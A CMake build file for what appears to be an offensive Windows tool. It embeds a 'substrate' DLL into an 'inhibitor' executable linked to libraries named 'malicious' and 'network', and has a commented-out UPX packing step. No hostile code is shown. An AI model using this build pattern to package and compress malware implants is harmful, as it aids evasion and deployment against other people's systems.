file(GLOB_RECURSE substrate_source_files substrate/*.hpp substrate/*.cpp)
add_library(substrate SHARED ${substrate_source_files})
target_link_libraries(substrate system network blaspheme malicious common userenv)

add_custom_command(
	TARGET substrate
	POST_BUILD
	COMMAND "${BINGENERATOR}" "${SUBSTRATE_DLL_PATH}" "${SUBSTRATE_HPP_PATH}" "SubstrateDll"
	COMMENT "Generating ${SUBSTRATE_HPP_PATH} WITH ${SUBSTRATE_DLL_PATH}"
)

file(GLOB_RECURSE inhibitor_source_files inhibitor/*)
add_executable(inhibitor WIN32 ${inhibitor_source_files})

# substrate has to be built before inhibitor, because of resource inclusion
target_link_libraries(inhibitor common malicious system network substrate shlwapi)
install(TARGETS inhibitor RUNTIME DESTINATION innocence)

# UPX Compression
#if ( CMAKE_BUILD_TYPE MATCHES Debug)
#	message(STATUS "Compressing disabled")
#elseif( CMAKE_BUILD_TYPE MATCHES Release)
#	if(WIN32)
#		message(STATUS "Compression activee sur ${BINARY_OUTPUT}/inhibitor.exe WITH ${COMPRESSOR}")
#		add_custom_command(
#			TARGET inhibitor
#			POST_BUILD
#			COMMAND "C:/innocence/compress.bat"
#			COMMENT "Compressing ${BINARY_OUTPUT}/inhibitor.exe WITH ${COMPRESSOR}"
#		)
#	endif()
#endif ()
